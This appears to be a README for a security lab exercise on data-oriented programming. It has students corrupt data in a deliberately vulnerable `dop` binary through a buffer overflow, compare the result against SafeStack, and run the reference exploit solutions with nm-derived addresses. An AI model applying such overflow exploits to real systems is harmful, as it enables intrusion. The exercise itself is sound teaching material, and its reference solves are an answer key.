# Data-Oriented Programming

## Goal

Steer `dop` by corrupting data, not control flow, and compare against SafeStack.

## Solution

The overflow in `f` reaches the data its interpreter loop reads, so a crafted payload drives the loop to a chosen result without diverting any branch.
`solve/payload.c` builds the `FAILAA!` payload and `solve/exploit.py` the `SSPPWN!` one.
Both take `vulbuf` (and `payload.c` also `zone1`) from the binary, which is built `-no-pie` so those addresses are fixed; read them with `nm dop`.
SafeStack moves the vulnerable buffer off the unsafe stack; discuss whether it stops this, given the attack never changes a return address.

## Build & Solve

`build/` has `dop.c`, the `payload.c` skeleton and the Makefile; `solve/` has the reference `payload.c` and `exploit.py`.
Build `dop` (non-PIE, so `vulbuf`/`zone1` are fixed), then run either reference solve against it:

```console
cd build && make                       # builds dop
cp dop ../solve/ && cd ../solve

# SSPPWN via exploit.py — reads vulbuf from the binary, so no address to pass:
python3 exploit.py

# FAILAA via payload.c — pass the two addresses from nm:
clang -no-pie -fno-pie -o payload payload.c
./payload 0x$(nm dop | awk '$3=="vulbuf"{print $1}') \
          0x$(nm dop | awk '$3=="zone1"{print $1}') > pl
./dop < pl
```
